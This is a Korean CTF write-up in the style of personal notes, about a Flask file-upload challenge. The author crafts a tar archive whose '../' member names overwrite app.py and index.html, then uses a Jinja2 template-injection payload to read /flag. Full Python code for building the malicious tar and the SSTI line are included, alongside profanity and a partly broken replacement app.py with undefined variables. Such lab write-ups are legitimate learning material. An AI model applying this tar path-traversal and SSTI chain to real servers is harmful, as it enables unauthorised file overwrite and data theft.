갑자기 준석이가 와서 문제 힌트를 주고 갔음 
check_tar() 에서 파일의 압축을 풀 때 파일의 파일이름을 통해서 파일이 풀어지면서 의도하지 않은 위치에 파일이 풀어질 수 있다고함
예를 들어서 some.tar.gz 라는 압축파일이 있을 때 해당 압축파일 내부 파일 중 ../flag.txt
flag.txt 파일이 원래 위치해야하는 경로의 상위에 올라가게되는 취약점이 있다고함

지금 문제가 안 풀리는 문제가 2가지가 있음
1. 파일 이름에 경로 지정 문자(/, \, |) 등을 쓸 수 없음
=> 파이썬 코드를 이용해서 내부에 ../ 이 포함될 수 있는 압축파일을 생성함

2. 어떻게해서 된다고 해도 파일의 내용을 출력해야 하는데 압축 파일을 풀어서 해당 파일을 출력하는 코드가 안 보임
msg는 "Success", "Fail" 둘 중의 하나의 값 밖에 안 가지는데 msg를 통해서 하는 건 아닐 거 같고
아마도 압축을 풀면서 무언가 명령 코드를 실행해서 해당 명령코드로 해야하는 거 같은 느낌임


그동안 CTF 문제 풀면서 가장 오래 걸리고 ㅈ같은 문제였다 ㄹㅇ

문제 파일 받으면 간단함 Dockerfile 통해서 파일들이 어디에 뭐가 있다는 걸 알려주고 app.py랑 index.html만 주고 끝

문제의 핵심은 원래라면 파일 이름에 /가 안 들어가서 Path Traversal이 안 되는데
TAR 형식은 압축할 때 /가 들어갈 수 있어서 압축을 풀면서 파일이 다른 곳의 파일을 덮어씌울 수 있다는 취약점이 존재함

처음에는 아 그래요? 음 그렇구나~ 그래서? 뭐 어쩌라고 flag를 덮어씌울 수도 없는데 뭐 어쩌라는 거지 하다가
나중에야 제미나이를 통해서 app.py나 index.html을 덮어씌워서 flag값을 출력하라는 걸 알게됨

아하! 글쿠나! 그러면 app.py에서 msg를 통해서 index.html에 Success나 Fail을 출력하니까
msg에 flag값을 넣어버리면 되겠네!

해서 어떻게 어떻게 app.py의 경로를 찾고 덮어씌우고를 여러번 해봤는데 안 돼 씨이잉발
왜 안 됨 나중에 알고 보니까 app.py가 실행중일 때 메모리에 이미 app.py의 내용이 올라갔음
app.py의 서버가 재로딩 되는 게 아니면 app.py를 읽지 않는다는 문제가 있었음
근데 클라이언트에서 서버를 재로딩 시키는 건 쉽지 않음

아 10 그래서 index.html에서 flag값을 어떻게 읽지? 하다가 제미나이가 그럴 수 없대
않이 ㅅㅂ 그래서 '아 안되는구나' 하다가 나중에 갑자기 또 되는 방법을 알려줬어 이 씨입새끼

그래서 index.html을 덮어씌우고 Flag값을 읽어서 해결됐다 이말이야


일단 몇 가지 알아낸 점은
- tar파일이 CLI창에서 TAR 명령어 말고 파이썬으로도 만들 수 있음 맨아래에 해당 코드를 작성해둠
- 서버는 이미 메모리에 올라갔으니까 재로딩 하지 않는 이상 코드를 바꾼다고 해서 서버가 바로 코드를 반영하지는 않음
- 다 되는지는 몰라도 html에서 서버 경로의 파일을 읽어올 수 있음, 아래는 해당 코드

<h1>Flag is: {{ self.__init__.__globals__.__builtins__.open('/flag').read() }}</h1>

=> 제미나이 해석
이 코드는 Python의 객체 구조를 타고 올라가서 서버의 내부 함수에 접근합니다.
1) {{ ... }}: 템플릿 엔진이 이 안의 내용을 실행하고 결과를 HTML에 출력하라는 기호입니다.
2) self.__init__: 현재 객체의 초기화 함수에 접근합니다.
3) .__globals__: 해당 함수가 실행되는 전역 네임스페이스(변수, 함수 등)를 들여다봅니다.
4) .__builtins__: Python의 기본 내장 함수 모음(open, eval, print 등)에 접근합니다.
5) .open('/flag').read(): 내장된 open 함수를 사용해 서버 루트 디렉토리에 있는 /flag 파일을 읽어옵니다.






tar파일 생성 코드

import tarfile
import io

with tarfile.open("traversal_test.tar", "w") as tar:    # 생성할 tar파일명 지정
    # 덮어 씌울 app.py의 내용
    app_py_contents = """        
from flask import Flask, render_template
import os.path
import os

app = Flask(__name__)
TEMP_DIR = "temp"

if not os.path.exists(TEMP_DIR):
    os.mkdir(TEMP_DIR)

@app.route('/', methods=['GET'])
def main():
    # 1. 파일 경로 설정 (app.py와 같은 위치에 있는 alpha.txt)
    file_path = '/flag'
    
    # 2. 파일 읽기 처리
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
    else:
        file_content = "/_flag 파일을 찾을 수 없습니다."

    # 3. render_template을 통해 msg 변수로 전달
    # return render_template('index.html', msg=file_content)
    return render_template('index.html', msg=sex1)


@app.route('/upload', methods=['POST'])
def upload_file():
    file_path = '/flag'
    
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            file_content = f.read()
    else:
        file_content = "/upload_flag 파일을 찾을 수 없습니다."

    # return render_template('index.html', msg=file_content)
    return render_template('index.html', msg=sex2)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)

"""

    app_py_binary_data = app_py_contents.encode('utf-8')
    app_py_file_data = io.BytesIO(app_py_binary_data)

    # 가장 중요한 부분 중 하나로 tar에 들어갈 파일 이름을 지정하는데 /가 포함될 수 있어서 Path Traversal이 됨
    # 여기서는 압축이 풀리는 경로 -> 상위 경로 -> templates -> index.html로 들어감
    app_py_info = tarfile.TarInfo(name="../app.py")     
    
    app_py_info.size = len(app_py_binary_data)

    tar.addfile(tarinfo=app_py_info, fileobj=app_py_file_data)




# --------------------------------------------------------------------------

    index_html_contents = """
    # 덮어 씌울 index.html의 내용
<!DOCTYPE html>
<html>
    <head>
        <title>Main Page</title>
    </head>
    <body>
        <p>{{ msg }}</p>
        <form action="/upload" method="post", enctype="multipart/form-data">
            <input type="file" name="file" />
            <input type="submit" />
        </form>
        <p> 씨발려나! </p>
        <h1>Flag is: {{ self.__init__.__globals__.__builtins__.open('/flag').read() }}</h1>
    </body>
</html>


"""

    index_html_binary_data = index_html_contents.encode('utf-8')
    index_html_file_data = io.BytesIO(index_html_binary_data)

    # 가장 중요한 부분 중 하나로 tar에 들어갈 파일 이름을 지정하는데 /가 포함될 수 있어서 Path Traversal이 됨
    # 여기서는 압축이 풀리는 경로 -> 상위 경로 -> templates -> index.html로 들어감
    index_html_info = tarfile.TarInfo(name="../templates/index.html") 
    
    index_html_info.size = len(index_html_binary_data)

    tar.addfile(tarinfo=index_html_info, fileobj=index_html_file_data)


print("Path Traversal 테스트용 TAR 파일이 성공적으로 생성되었습니다.")





 